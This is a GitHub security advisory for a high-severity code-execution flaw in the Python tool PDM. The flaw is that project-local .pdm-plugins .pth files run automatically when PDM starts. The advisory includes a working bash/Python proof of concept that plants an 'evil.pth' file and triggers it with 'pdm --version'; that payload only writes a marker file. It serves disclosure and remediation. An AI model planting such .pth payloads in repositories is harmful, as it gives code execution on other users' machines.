# [H] PDM: Project-Controlled `.pdm-plugins` Content Executes Before CLI Parsing

## Summary
Severity: High
Advisory: GHSA-qq6c-99pv-prvf
CVE: CVE-2026-47781
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-11
Source: https://github.com/advisories/GHSA-qq6c-99pv-prvf
Type: github-advisory

## Affected
- PyPI: `pdm` — affected >=0 <2.27.0

## Details
## Summary

PDM automatically loads project-local plugin paths from `.pdm-plugins` during `Core` initialization. Because this path is added via `site.addsitedir()`, attacker-controlled `.pth` files inside the project plugin directory are processed and can execute Python code before normal CLI handling begins.

This allows arbitrary code execution with the privileges of the user running `pdm` from an untrusted repository checkout.

## Affected Behavior

- Trigger does not require `pdm install --plugins`
- A low-impact command such as `pdm --version` is sufficient
- Impact is strongest in CI, privileged shells, and automation contexts

## Affected Code

- `src/pdm/core.py:74-82`
- `src/pdm/core.py:310-333`
- `src/pdm/core.py:335-352`

## Technical Details

`Core.__init__()` calls `load_plugins()` before ordinary command execution. `load_plugins()` calls `_add_project_plugins_library()`, which derives the project-local `.pdm-plugins` library path and adds it through `site.addsitedir()`.

On CPython, `site.addsitedir()` processes `.pth` files found in the added directory. `.pth` lines beginning with `import ` are executed immediately. This creates a trust-boundary break: project-controlled files execute before the user explicitly opts into plugin installation or plugin loading.

## Impact

- Arbitrary code execution as the invoking user
- Potential credential theft, persistence, or workspace tampering
- Potential privilege escalation when `pdm` is run via `sudo`, root-owned CI jobs, or privileged service accounts

## Reproduction

PoC:

```bash
# Replace this with a Python interpreter that can run `python -m pdm`.
PDM_PY=/path/to/python-with-pdm
tmpdir=$(mktemp -d)

cat > "$tmpdir/pyproject.toml" <<'EOF'
[project]
name = "plugin-autoload-demo"
version = "0.0.1"
EOF

purelib=$(TMPDIR_ROOT="$tmpdir/.pdm-plugins" "$PDM_PY" - <<'PY'
import os
import sys
import sysconfig

base = os.environ["TMPDIR_ROOT"]
scheme_names = sysconfig.get_scheme_names()
if (sys.platform == "darwin" and "osx_framework_library" in scheme_names) or sys.platform == "linux":
    scheme = "posix_prefix"
elif sys.version_info < (3, 10):
    scheme = "nt" if os.name == "nt" else "posix_prefix"
else:
    scheme = sysconfig.get_default_scheme()
replace_vars = {"base": base, "platbase": base}
print(sysconfig.get_path("purelib", scheme, replace_vars))
PY
)

mkdir -p "$purelib"
marker="$tmpdir/plugin-autoload-marker.txt"
printf '%s\n' "import pathlib; pathlib.Path(r'$marker').write_text('project plugin autoload executed', encoding='utf-8')" > "$purelib/evil.pth"

(
  cd "$tmpdir" &&
  "$PDM_PY" -m pdm --version
)

cat "$marker"
```

Expected result:

- A temporary project is created
- An `evil.pth` file is placed under `.pdm-plugins`
- Running `pdm --version` creates a marker file before CLI exit

Observed output from local validation:

```text
PDM, version 2.26.9

--- marker ---
project plugin autoload executed
```

## Severity

High

## CVSS v4.0

- Base score: `8.4` (`High`)
- Vector: `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

Rationale:

- `AV:L`: exploitation occurs through local execution of `pdm` against attacker-controlled repository content
- `AC:L`: no special bypass or race is required
- `AT:N`: no external precondition beyond the vulnerable workflow is required
- `PR:N`: the attacker does not need privileges on the victim host
- `UI:A`: the victim must actively run a `pdm` command in the malicious checkout
- `VC:H/VI:H/VA:H`: successful exploitation yields arbitrary code execution as the invoking user
- `SC:N/SI:N/SA:N`: the score is kept to same-system impact only

## Root Cause

Project-local plugin paths are implicitly trusted and loaded too early, and `.pth` processing is inherited from `site.addsitedir()`.

## Recommended Remediation

- Do not auto-load project-local `.pdm-plugins` by default
- Avoid `site.addsitedir()` for project-controlled plugin paths
- If project plugins must be supported, require explicit opt-in such as `--enable-project-plugins`
- Explicitly prevent `.pth` execution when loading project plugin paths

## Disclosure Notes

This issue is a strong standalone CVE candidate because it yields direct code execution from repository-controlled files without requiring the victim to run a project script explicitly.

## References
- https://github.com/pdm-project/pdm/security/advisories/GHSA-qq6c-99pv-prvf
- https://github.com/pdm-project/pdm
- https://github.com/pdm-project/pdm/releases/tag/2.27.0
